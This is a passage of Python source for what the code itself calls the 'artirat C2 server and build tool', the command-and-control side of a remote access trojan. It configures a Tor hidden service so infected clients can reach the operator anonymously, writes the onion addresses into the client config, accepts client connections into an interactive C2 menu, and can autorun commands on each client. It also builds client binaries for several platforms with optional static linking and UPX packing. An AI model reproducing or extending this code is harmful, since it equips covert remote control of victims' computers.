        with open(CLIENT_HOSTNAME_PATH, "w") as f:
            f.write("\n".join(lines) + "\n")
        with open(CLIENT_HOSTNAME_PATH) as f:
            new_content = f.read()
        print(f"[New config]:\n{new_content.strip()}")
        print(f"[+] Wrote {len(lines)} hostname(s) to {CLIENT_HOSTNAME_PATH}")
    else:
        print("[-] No hostnames to write")


def configure_tor(published_port=1337):
    torrc = find_system_torrc()
    if not torrc:
        torrc = TORRC_PATH
    services = parse_torrc(torrc)
    for hs_dir, port, target in services:
        if "artirat" in hs_dir.lower():
            print(f"[-] Hidden service already configured for {hs_dir} (port {port})")
            return
    we_write = torrc if os.access(torrc, os.W_OK) else TORRC_PATH

    existing = ""
    try:
        with open(we_write) as f:
            existing = f.read()
    except FileNotFoundError:
        pass

    with open(we_write, "a") as f:
        if "ControlPort" not in existing:
            f.write(f"\nControlPort {CONTROL_PORT}\n")
        if "CookieAuthentication" not in existing:
            f.write(f"CookieAuthentication 1\n")
        f.write(f"\nHiddenServiceDir /var/lib/tor/artirat-server\n")
        f.write(f"HiddenServicePort {published_port} 127.0.0.1:1337\n")
    print(f"[+] Added ControlPort, CookieAuthentication, and HiddenServiceDir /var/lib/tor/artirat-server with port {published_port} -> 127.0.0.1:1337 to {we_write}")


def connect_tor():
    print("[*] Connecting to Tor on localhost:9051...")
    from stem.control import Controller
    for _ in range(30):
        try:
            controller = Controller.from_port(port=9051)
            controller.authenticate()
            print("[+] Connected and authenticated to Tor")
            return controller
        except Exception:
            time.sleep(1)
            continue
    raise RuntimeError("Could not connect to Tor on localhost:9051")


def create_hidden_service(controller):
    HS_DIR = os.path.join(SERVER_CONFIG_DIR, "hidden_service")
    os.makedirs(HS_DIR, exist_ok=True)
    os.chmod(HS_DIR, 0o700)

    print("[*] Setting up hidden service...")
    controller.set_options([
        ("HiddenServiceDir", HS_DIR),
        ("HiddenServicePort", f"{PORT} {HOST}:{PORT}"),
    ])

    hostname_file = os.path.join(HS_DIR, "hostname")
    for _ in range(60):
        if os.path.exists(hostname_file):
            with open(hostname_file) as f:
                hostname = f.read().strip()
            print(f"[+] Hidden service ready: {hostname}")
            return hostname
        time.sleep(1)

    raise RuntimeError("Timed out waiting for hidden service hostname")


def write_hostname(hostname: str):
    os.makedirs(CLIENT_CONFIG_DIR, exist_ok=True)
    with open(CLIENT_HOSTNAME_PATH, "w") as f:
        f.write(hostname + "\n")
    print(f"[+] Wrote hostname to {CLIENT_HOSTNAME_PATH}")


def run_c2_server():
    _load_stream_config()
    manager = ClientManager()
    threading.Thread(target=accept_clients, args=(manager,), daemon=True).start()
    time.sleep(0.3)

    threading.Thread(target=_auto_setup_hidden_service, daemon=True).start()

    print()
    c2_menu(manager)


def _auto_setup_hidden_service():
    try:
        print("[*] Connecting to Tor for persistent hidden service setup...")
        controller = connect_tor()
        try:
            hostname = create_hidden_service(controller)
        finally:
            controller.close()
        print(f"[+] Persistent hidden service: {hostname}")

        services = parse_torrc()
        lines = []
        for hs_dir, port, target in services:
            if "artirat" not in hs_dir.lower():
                continue
            h = get_hostname_from_dir(hs_dir)
            if h:
                lines.append(f"{h}:{port}")
        lines.append(f"{hostname}:1337")
        os.makedirs(CLIENT_CONFIG_DIR, exist_ok=True)
        with open(CLIENT_HOSTNAME_PATH, "w") as f:
            f.write("\n".join(lines) + "\n")
        print(f"[+] Wrote {len(lines)} hostname(s) to {CLIENT_HOSTNAME_PATH}")
    except Exception as e:
        print(f"[-] Persistent hidden service setup skipped (non-fatal): {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="artirat C2 server and build tool",
        epilog="Use -x/--execute <command> to run a command non-interactively. "
               "Multiple commands can be separated by semicolons. "
               "Examples: -x 'build linux --verbose', -x 'write_config; build all'"
    )
    parser.add_argument("-w", "--write-hostname", action="store_true", help="Parse torrc and write hostname:port to client config")
    parser.add_argument("-i", "--interactive", action="store_true", help="Drop into the interactive C2 shell after executing -x commands")
    parser.add_argument("-a", "--autorun-commands", help="Comma-separated list of commands to autorun on each client connection")
    args, extra = parser.parse_known_args()

    execute_str = None
    for i, arg in enumerate(extra):
        if arg in ("-x", "--execute"):
            execute_str = " ".join(extra[i+1:])
            break

    if args.write_hostname:
        write_config()
        if not args.interactive:
            sys.exit(0)

    manager = None
    if execute_str or args.interactive:
        _load_stream_config()
        manager = ClientManager()
        threading.Thread(target=accept_clients, args=(manager,), daemon=True).start()
        time.sleep(0.3)
        if args.autorun_commands:
            manager.save_autorun(args.autorun_commands.replace(",", ";"))

    if execute_str:
        commands = execute_str.split(";")
        for raw in commands:
            raw = raw.strip()
            if not raw:
                continue
            parts = raw.split()
            cmd = parts[0]
            verbose = "--verbose" in parts
            static = "--static" in parts
            upx = "--upx" in parts
            if cmd == "build":
                if len(parts) < 2 or parts[1] in ("--verbose", "--static", "--upx"):
                    print("Usage: build <target> [--verbose] [--static] [--upx]")
                    print("       build all [--verbose] [--static] [--upx]")
                    print(f"Targets: {', '.join(ALL_BUILD_TARGETS)}")
                    if not args.interactive:
                        sys.exit(1)
                    continue
                target_arg = parts[1]
                if target_arg == "all":
                    targets = EXE_BUILD_TARGETS
                    for t in targets:
                        print(f"\n{'='*60}")
                        build_client(t, verbose=verbose, static=static, upx=upx)
                    print(f"\n{'='*60}")
                    print("[+] All builds finished")
                else:
                    ok = build_client(target_arg, verbose=verbose, static=static, upx=upx)
                    if not ok and not args.interactive:
                        sys.exit(1)
            elif cmd == "write_config":
                write_config()
            elif cmd == "configure_tor":
                port = int(parts[1]) if len(parts) > 1 else 1337
                configure_tor(port)
            else:
                print(f"[-] Unknown command: {cmd}")
                print("    Commands: build, write_config, configure_tor")
                if not args.interactive:
                    sys.exit(1)

    if args.interactive and manager:
        print()
        c2_menu(manager)
    elif not execute_str:
        run_c2_server()
    elif not execute_str:
        run_c2_server()
